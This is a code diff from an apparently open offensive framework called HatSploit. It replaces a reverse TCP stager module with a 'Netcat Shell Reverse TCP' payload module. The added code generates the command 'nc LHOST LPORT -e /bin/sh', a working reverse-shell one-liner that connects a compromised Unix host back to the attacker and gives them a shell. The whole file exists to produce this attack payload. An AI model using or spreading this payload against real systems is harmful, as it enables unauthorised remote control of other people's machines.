@@ -24,80 +24,51 @@
 # SOFTWARE.
 #
 
-from core.lib.module import Module
-from utils.handler.handler import Handler
+from core.lib.payload import Payload
 from utils.tcp.tcp import TCPClient
 
 
-class HatSploitModule(Module, Handler, TCPClient):
+class HatSploitPayload(Payload, TCPClient):
     details = {
-        'Name': "Reverse TCP Stager",
-        'Module': "exploit/multi/stager/reverse_tcp",
+        'Category': "single",
+        'Name': "Netcat Shell Reverse TCP",
+        'Payload': "unix/generic/netcat_reverse_tcp",
         'Authors': [
             'enty8080'
         ],
-        'Description': "Reverse TCP Stager.",
+        'Description': "Netcat shell reverse TCP payload.",
         'Dependencies': [
             ''
         ],
         'Comments': [
             ''
         ],
-        'Platform': "multi",
-        'Risk': "high"
-    }
-
-    payload = {
-        'Description': "Payload to use.",
-        'Value': "unix/generic/sh_reverse_tcp",
-        'Categories': None,
-        'Architectures': None,
-        'Platforms': None,
-        'Types': None
+        'Architecture': "generic",
+        'Platform': "unix",
+        'Risk': "high",
+        'Type': "reverse_tcp"
     }
 
     options = {
-        'SRVHOST': {
-            'Description': "Local host to listen on.",
+        'LHOST': {
+            'Description': "Local host.",
             'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
-        'SRVPORT': {
-            'Description': "Local port to listen on.",
+        'LPORT': {
+            'Description': "Local port.",
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FOREVER': {
-            'Description': "Start listener forever.",
-            'Value': "no",
-            'Type': "boolean",
-            'Required': False
         }
     }
 
     def run(self):
-        local_host, local_port, forever = self.parse_options(self.options)
+        local_host, local_port = self.parse_options(self.options)
 
-        if forever.lower() in ['yes', 'y']:
-            while True:
-                status = self.handle_session(
-                    host=local_host,
-                    port=local_port,
-                    method="reverse",
-                    payload=self.payload
-                )
+        self.output_process("Generating payload...")
+        payload = f"nc {local_host} {local_port} -e /bin/sh"
 
-                if not status:
-                    return
-        else:
-            status = self.handle_session(
-                host=local_host,
-                port=local_port,
-                method="reverse",
-                payload=self.payload
-            )
-
-            if not status:
-                return
+        self.payload = payload
+        self.instructions = payload
